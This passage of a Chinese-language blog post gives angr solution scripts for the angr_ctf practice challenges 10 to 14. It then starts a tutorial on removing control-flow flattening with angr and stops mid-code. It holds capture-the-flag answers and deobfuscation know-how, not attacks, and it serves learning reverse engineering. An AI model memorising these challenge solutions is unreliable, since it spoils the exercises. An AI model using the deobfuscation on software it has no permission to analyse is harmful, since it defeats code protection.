<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;10_angr_simprocedures&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">simpro</span>(angr.SimProcedure):</span><br><span class="line">        <span class="comment"># 参数需要对应要hook的函数</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, user_input, lenth</span>):</span><br><span class="line">            to_cmp = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">            content = self.state.memory.load(user_input, lenth)</span><br><span class="line">            <span class="keyword">return</span> claripy.If(content == to_cmp, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">    <span class="comment"># 作为hook_symbol的参数的用户函数要先实例化</span></span><br><span class="line">    proj.hook_symbol(<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simpro())</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-sim-scanf-hook库函数"><a href="#angr-sim-scanf-hook库函数" class="headerlink" title="angr_sim_scanf | hook库函数"></a>angr_sim_scanf | hook库函数</h3><p>hook库函数的流程和上一题一样 这题也是虚拟控制流混淆 要用hook绕过angr只能输入一个参数的问题(现版本已经没有这个问题):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">20</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  qmemcpy(s, <span class="string">&quot;SUQMKQFX&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %u&quot;</span>, buffer0, buffer1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, s, <span class="number">4u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, &amp;s[<span class="number">4</span>], <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然函数原型是可变参数 但是构造hook函数的时候根据要hook的那个scanf进行参数个数的设置就行:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;11_angr_sim_scanf&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">sim_scanf</span>(angr.SimProcedure):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, format_string, buf1, buf2</span>):</span><br><span class="line">            p1, p2 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">8</span>*<span class="number">4</span>), claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">8</span>*<span class="number">4</span>)</span><br><span class="line">            self.state.memory.store(buf1, p1, endness=proj.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(buf2, p2, endness=proj.arch.memory_endness)</span><br><span class="line">            self.state.<span class="built_in">globals</span>[<span class="string">&#x27;ans&#x27;</span>] = (p1, p2)</span><br><span class="line">    proj.hook_symbol(<span class="string">&#x27;__isoc99_scanf&#x27;</span>, sim_scanf())</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solved_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1, p2 = solved_state.<span class="built_in">globals</span>[<span class="string">&#x27;ans&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(solved_state.solver.<span class="built_in">eval</span>(p1, cast_to=<span class="built_in">bytes</span>) + solved_state.solver.<span class="built_in">eval</span>(p2, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-veritesting-不知道有没有用的技术"><a href="#angr-veritesting-不知道有没有用的技术" class="headerlink" title="angr_veritesting | 不知道有没有用的技术"></a>angr_veritesting | 不知道有没有用的技术</h3><p>这题的官方解现在(2024.7.30)已经跑不出结果出来了 据官方文档 这种方法是结合静态符号分析来减少符号路径的条数 但是就算开启了也没办法解决本题路径爆炸问题 所以用之前的做法做这题 把路径爆炸的部分替换成用户函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;12_angr_veritesting&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simgr(state, veritesting = <span class="literal">True</span>)</span><br><span class="line">    simgr.explore(find = <span class="number">0x8048635</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        now_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">complex_function</span>(<span class="params">a1, a2</span>):</span><br><span class="line">            <span class="keyword">return</span> (a1 - <span class="number">65</span> + <span class="number">2</span> * a2) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            ans = now_state.memory.load(now_state.regs.ebp.args[<span class="number">0</span>] - <span class="number">0x2d</span> + i, <span class="number">1</span>)</span><br><span class="line">            now_state.add_constraints(ans == complex_function(<span class="number">75</span>, i + <span class="number">93</span>))</span><br><span class="line">            <span class="built_in">print</span>(now_state.solver.<span class="built_in">eval</span>(ans, cast_to=<span class="built_in">bytes</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-static-binary-静态编译程序的符号执行"><a href="#angr-static-binary-静态编译程序的符号执行" class="headerlink" title="angr_static_binary | 静态编译程序的符号执行"></a>angr_static_binary | 静态编译程序的符号执行</h3><p>如果程序是静态编译出来的 angr就会把库函数当成用户函数 在符号执行的时候会进入库函数进行完全的符号执行 相当于步入调试 以前识别出库函数使用的是步过调试 这时候就需要hook这些静态编译进程序的库函数 替换成angr自带的库函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;13_angr_static_binary&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    proj.hook(<span class="number">0x8048D10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804ED40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804ED80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__isoc99_scanf&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x8048280</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804F350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>hook的地址就用库函数的起始地址 区分是glibc还是libc的函数看前面有没有两个下划线就行</p>
<h3 id="angr-shared-library-符号执行动态链接库中的函数"><a href="#angr-shared-library-符号执行动态链接库中的函数" class="headerlink" title="angr_shared_library | 符号执行动态链接库中的函数"></a>angr_shared_library | 符号执行动态链接库中的函数</h3><p>angr的好处就是可以设定初始条件直接符号执行一段代码 而不用像调试器一样如果是库的话要附加到程序上才能调试 这题要符号执行一个外部库的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 14_angr_shared_library</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( validate((<span class="type">int</span>)s, <span class="number">8</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib14_angr_shared_library.so</span></span><br><span class="line"></span><br><span class="line">_BOOL4 __cdecl <span class="title function_">validate</span><span class="params">(<span class="type">char</span> *s1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">20</span>]; <span class="comment">// [esp+4h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(s2, <span class="string">&quot;PVBLVTFT&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;s1[j];</span><br><span class="line">    *v3 = complex_function(s1[j], j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(s1, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加载库需要指定基址 这里选<code>base = 0x4000000</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="number">0x4000000</span></span><br><span class="line">func_offset = <span class="number">0x6D7</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;custom_base_addr&#x27;</span>: base</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>为了设定函数执行的初始值需要一个call_state来指定函数起始地址和参数 这里假定用户输入的字符串存放地址是0x3000000:</p>
<p><code>state = proj.factory.call_state(base + func_offset, 0x3000000, 8)</code></p>
<p>后面的流程就和符号执行普通的程序一样了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    base = <span class="number">0x4000000</span></span><br><span class="line">    func_offset = <span class="number">0x6D7</span></span><br><span class="line"></span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">        <span class="string">&#x27;main_opts&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;custom_base_addr&#x27;</span>: base</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    state = proj.factory.call_state(base + func_offset, <span class="number">0x3000000</span>, <span class="number">8</span>)</span><br><span class="line">    pw = claripy.BVS(<span class="string">&#x27;pw&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">    state.memory.store(<span class="number">0x3000000</span>, pw)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find = base + <span class="number">0x783</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        new_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        new_state.add_constraints(new_state.regs.eax == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(new_state.solver.<span class="built_in">eval</span>(pw, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h2 id="用Angr实现去控制流平坦化"><a href="#用Angr实现去控制流平坦化" class="headerlink" title="用Angr实现去控制流平坦化"></a>用Angr实现去控制流平坦化</h2><p>开工之前先简单了解一下<a href="https://security.tencent.com/index.php/blog/msg/112">控制流平坦化的原理</a> 去平坦化的核心任务就是恢复各个<strong>真实块(relevant block)</strong> 即原程序中就有的块之间的联系 而用Angr完成这项任务的难点有:</p>
<ol>
<li><p>angr自带的块对象与IDA中graph view的block有区别 angr产生的控制流图(ControlFlow Graph, CFG)会被<code>call</code>指令分割 而IDA中的块直到跳转才会结束一个块 幸运的是官方的附带组件库<code>angr_management</code>中有一个转化angr CFG为IDA CFG的函数 但是同时也带来了第二个问题</p>
</li>
<li><p>angr_management中的to_supergraph产生的IDA CFG实际上是networkx库中的DI-Graph(有向图)类的派生类 相比angr CFG 可操作性直线下降</p>
</li>
<li><p>对原来产生分支的块的处理</p>
</li>
</ol>
<p>这里一步步地进行去平坦化并在遇到这些问题时进行解释</p>
<h3 id="获取各种块以方便后续的操作"><a href="#获取各种块以方便后续的操作" class="headerlink" title="获取各种块以方便后续的操作"></a>获取各种块以方便后续的操作</h3><p>这里就要发挥IDA CFG的优势了 根据上文引用的资料 各个块之间的界限以及各自的特征(以有向图的视角看 特征就是一个块的in-degree和out-degree)还是非常明显的:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F10%2F20240810-222100.png" alt="image-20240810222053426"></p>
<p>将angr CFG变成IDA CFG后根据特征汇总每种块:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_CFG</span>(<span class="params">proj : angr.Project</span>):</span><br><span class="line">    cfg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>, force_complete_scan=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(args.addr, <span class="number">16</span>) <span class="keyword">if</span> args.addr != <span class="string">&#x27;main&#x27;</span> <span class="keyword">else</span> args.addr</span><br><span class="line">    cfg = cfg.functions[addr].transition_graph</span><br><span class="line">    IDA_cfg = graph.to_supergraph(cfg) </span><br><span class="line">    <span class="keyword">return</span> IDA_cfg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Blocks</span>(<span class="params">cfg</span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    blocks = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes():</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;entry&#x27;</span>] = node</span><br><span class="line">        <span class="keyword">elif</span> cfg.out_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;exit&#x27;</span>] = node</span><br><span class="line">    blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] = <span class="built_in">list</span>(cfg.successors(blocks[<span class="string">&#x27;entry&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]):</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) != <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>] = node</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    blocks[<span class="string">&#x27;relevant&#x27;</span>] = [blocks[<span class="string">&#x27;entry&#x27;</span>]] + [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]) <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">1</span>] + [blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    blocks[<span class="string">&#x27;irrelevant&#x27;</span>] = [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes() <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]]</span><br><span class="line">    <span class="keyword">return</span> blocks</span><br></pre></td></tr></table></figure>

<h3 id="获取真实块的详细信息"><a href="#获取真实块的详细信息" class="headerlink" title="获取真实块的详细信息"></a>获取真实块的详细信息</h3><p>这一步的目的是为下一步重建真实块之间的联系做铺垫 真实块在原程序中最多有两个out-degree 也就是说这里要对真实块进行分类 最简单的就是没有in-degree和没有out-degree的入口和终止块 剩下的程序内容可以分为有分支和无分支的真实块 稍微了解一下(x86_64)控制流平坦化的实现就能发现 原本的<code>jx</code>跳转都需要转化为对对整个控制流起决定性的关键值的分支化赋值 具体实现就是采用<code>cmovxx</code>指令:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F10%2F20240810-223042.png" alt="image-20240810222920030"></p>
<p><code>cmovxx</code>指令会根据zf, sf等标志位来对源寄存器进行赋值 例如cmovz会在zf&#x3D;1时执行mov eax, ecx反之什么也不干 在确定框架的前提下用angr CFG自带的<code>.capstone.ins</code>方法来获取汇编指令 并用汇编指令来判断该块是否会产生分支 这里就会体现第1, 2点的缺陷了 因为用IDA CFG创建的真实块如果调用某函数的话 在对应的angr CFG中会是分隔的一个或几个块 这里用递归的方法找到angr CFG中包含<code>jmp</code>指令的块来保证已经分析完一个完整IDA CFG块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_branch</span>(<span class="params">block_addr, all_branches, target, _<span class="keyword">from</span>=<span class="literal">None</span>, flag=<span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># This function is used to get the address where the branch is located with it&#x27;s type and the address of the end of the block</span></span><br><span class="line">    <span class="keyword">if</span> _<span class="keyword">from</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        _<span class="keyword">from</span> = block_addr</span><br><span class="line">        all_branches[_<span class="keyword">from</span>] = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">    block = proj.factory.block(block_addr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">NOP</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    block_ins = block.capstone.insns</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> block_ins:</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">            <span class="comment"># Hook all calls to avoid errors in the CFG(too deep recursion)</span></span><br><span class="line">            proj.hook(ins.address, hook=NOP, length=ins.size)</span><br><span class="line">        <span class="keyword">elif</span> ins.mnemonic.startswith(<span class="string">&#x27;cmov&#x27;</span>):</span><br><span class="line">            all_branches[_<span class="keyword">from</span>][<span class="number">0</span>], all_branches[_<span class="keyword">from</span>][<span class="number">1</span>] = ins.address, ins.mnemonic</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;jmp&#x27;</span> <span class="keyword">or</span> ins.mnemonic == <span class="string">&#x27;retn&#x27;</span>:</span><br><span class="line">        all_branches[_<span class="keyword">from</span>].append(ins.address)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Get_branch(ins.address + ins.size, all_branches, target, _<span class="keyword">from</span>, flag)</span><br></pre></td></tr></table></figure>

<p> 最后<code>all_branches</code>就会包含所有真实块的3个信息:起始地址, 分支类型(若没有则为None), 结束地址 在后面的恢复控制流中会用到</p>
<h3 id="重建控制流"><a href="#重建控制流" class="headerlink" title="重建控制流"></a>重建控制流</h3><p>接下来只需要根据分支类型来确定真实块间的关系就算是基本完成任务了 但是难点也来了 原本我的想法是不采用以真实块作为起点的宽搜方式 而是从入口块开始执行 期待angr的符号执行会在<code>cmovxx</code>指令自动分离出两个<code>active</code> 然后只要不断使用<code>step()</code>方法直到<code>active.addr</code>出现在真实块的起始地址里就能轻松获取控制流 但是angr只会在跳转产生分支 根本不鸟我 完全没有产生分支 <strong>似了</strong></p>
<p>然后我的想法是根据分支类型来设置sf, zf等标志位 手动产生两条active 但是angr本来设计来就是遍历所有可能的跳转的 根本没有标志位 <strong>又似了</strong></p>
<p>最后在网上找到了一种方法 通过控制angr底层的vex IR的执行来达到上面第二种尝试的目的:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_successors</span>(<span class="params">node, targets : <span class="built_in">list</span>, branch_sign=<span class="literal">None</span>, cond=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> branch_sign <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">apply_branch</span>(<span 